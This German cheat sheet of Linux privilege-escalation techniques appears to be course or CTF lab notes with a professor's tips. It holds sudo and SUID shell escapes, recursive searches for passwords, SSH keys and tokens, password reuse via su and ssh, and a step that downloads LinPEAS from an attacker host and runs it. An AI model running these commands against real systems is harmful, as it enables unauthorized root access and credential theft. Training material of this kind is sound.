# 🐧 Linux PrivEsc

> Fokus: Shell upgraden, Hinweise in Dateien, `sudo -l`, SUID/GTFOBins, versteckte Dateien, Passwörter wiederverwenden, root.txt auch mit euid-Rechten lesen.

---

## 1. Basis-Enum

```bash
whoami; id; hostname; pwd
uname -a
sudo -l
cat /etc/passwd | cut -d: -f1
ip a
```

> **Hinweis Prof:** Bei PrivEsc zuerst schauen: Wer bin ich? Welche User? Welche Rechte? Welche Dateien?

---

## 2. Shell stabilisieren

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
export TERM=xterm
```

→ Details: [shell-upgrade.md](../../99-Resources/shell-upgrade.md)

---

## 3. Hinweise und versteckte Dateien

```bash
ls -la
ls -la /home/*
ls -la /opt /var /var/www /srv /tmp 2>/dev/null
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
ls -la /var/mail /var/spool/mail 2>/dev/null
cat /var/mail/* 2>/dev/null
```

> **Hinweis Prof:** Viel `ls -la`. Versteckte Dateien und Ordner können entscheidend sein. Interessante Orte: `/home`, `/opt`, `/var`, `/var/www`.

---

## 4. Suchbefehle nach Loot

```bash
# Flags
find / -iname 'user.txt' -o -iname 'root.txt' 2>/dev/null

# Backups/Notizen/Keys
find / -iname '*backup*' -o -iname '*.bak' -o -iname '*.old' -o -iname '*.zip' 2>/dev/null
find / -iname '*.txt' -o -iname '*note*' -o -iname '*.kdbx' -o -iname '*.pdf' 2>/dev/null
find / -iname 'id_rsa' -o -iname '*.key' -o -iname '*.pem' 2>/dev/null

# Strings in typischen Orten
grep -RiE 'pass|pwd|user|key|token|secret|backup|cred' /home /opt /var/www /etc 2>/dev/null
```

> **Hinweis Prof:** Suchbefehle für `root`, `user`, `backup`, `key` vorbereiten. Backups enthalten wichtige Daten.

---

## 5. sudo -l → GTFOBins

```bash
sudo -l
```

Wenn du ein Binary mit sudo ausführen darfst:

1. Auf [GTFOBins](https://gtfobins.github.io/) nachsehen.
2. Erst versuchen, `root.txt` zu lesen.

Beispiele:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':set shell=/bin/sh' -c ':shell'
sudo /usr/bin/less /root/root.txt
```

---

## 6. SUID suchen und Auffälligkeiten priorisieren

```bash
find / -perm -4000 -type f 2>/dev/null | sort | tee /tmp/suid.txt
```

Nicht jede SUID-Datei ist automatisch verwundbar. Typische System-Binaries wie `passwd`, `su`, `mount`, `umount`, `chsh`, `chfn`, `newgrp` oder `gpasswd` sind oft normal. **Besonders auffällig** sind Interpreter, Editoren, Dateiwerkzeuge, Netzwerktools und eigene Programme:

```text
bash, sh, dash, python, perl, ruby, php, node
find, vim, vi, nano, less, more, awk, env
cp, tar, zip, rsync, make
nmap, socat, busybox, openssl
alles unter /opt, /usr/local/bin oder /home
unbekannte/custom Binaries mit ungewöhnlichem Namen
```

Schnellfilter:

```bash
grep -Ei '/(bash|sh|dash|python[0-9.]*|perl|ruby|php|node|find|vim|vi|nano|less|more|awk|env|cp|tar|zip|rsync|make|nmap|socat|busybox|openssl)$|^/opt/|^/usr/local/|^/home/' /tmp/suid.txt
```

Jeden Treffer prüfen:

```bash
ls -la <BINARY>
file <BINARY>
<BINARY> --version 2>&1 | head
strings -n 6 <BINARY> | less
```

**Was suchst du?**

- Besitzer `root` und gesetztes `s` in den Owner-Rechten, z. B. `-rwsr-xr-x`.
- Binary ist bei GTFOBins unter **SUID** aufgeführt.
- Custom-Binary ruft Befehle ohne absoluten Pfad auf (`system("cp ...")`) → möglicher PATH-Hijack.
- Hartkodierte Passwörter, Dateipfade oder Befehle in `strings`.

Beispiele:

```bash
# bash SUID
/bin/bash -p

# find SUID
find . -exec /bin/sh -p \; -quit

# nmap alte Version mit Interactive Mode
nmap --interactive
nmap> !sh
```

Wenn du nur Dateileserechte/euid bekommst, direkt Flag testen:

```bash
cat /root/root.txt
```

> **Hinweis Prof:** Es kann sein, dass du nicht dauerhaft root wirst, aber über SUID/euid `root.txt` lesen kannst. Das reicht: Flag lesen und Beweis dokumentieren.

---

## 7. Capabilities / Cron / writable files

```bash
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron* 2>/dev/null
find / -writable -type f 2>/dev/null | head
find / -writable -type d 2>/dev/null | head
```

---

## 8. Reused Passwords

Wenn du ein Passwort gefunden hast:

```bash
su <anderer-user>
sudo -l
ssh <user>@$RHOST
```

---

## 9. LinPEAS ja, aber nicht blind

```bash
wget http://$LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee linpeas.txt
```

> **Hinweis Prof:** Nicht nur auf LinPEAS verlassen. Funde mit GTFOBins und manueller Enumeration verifizieren.
